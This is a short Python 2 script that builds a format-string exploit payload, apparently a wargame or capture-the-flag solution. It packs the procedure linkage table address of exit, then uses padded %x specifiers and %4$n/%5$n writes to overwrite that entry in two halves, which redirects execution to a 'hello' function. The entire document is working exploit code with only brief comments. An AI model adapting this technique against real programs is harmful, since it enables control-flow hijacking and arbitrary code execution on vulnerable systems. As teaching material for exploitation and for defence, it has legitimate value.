import struct

# address of exit in procedure linkage table
plt_exit = 0x08049724

# address of exit
exit1 = struct.pack("I", plt_exit)
# address of second half of exit
exit2 = struct.pack("I", plt_exit + 2)

# offset to create value 0x84b4 (first half of hello function)
offset1 = "%33964x"
# offset to create value 0x0804 (second half of hello function)
offset2 = "%33616x"

# write to exit1
write1 = "%4$n"
# write to exit2
write2 = "%5$n"

print exit1 + exit2 + offset1 + write1 + offset2 + write2
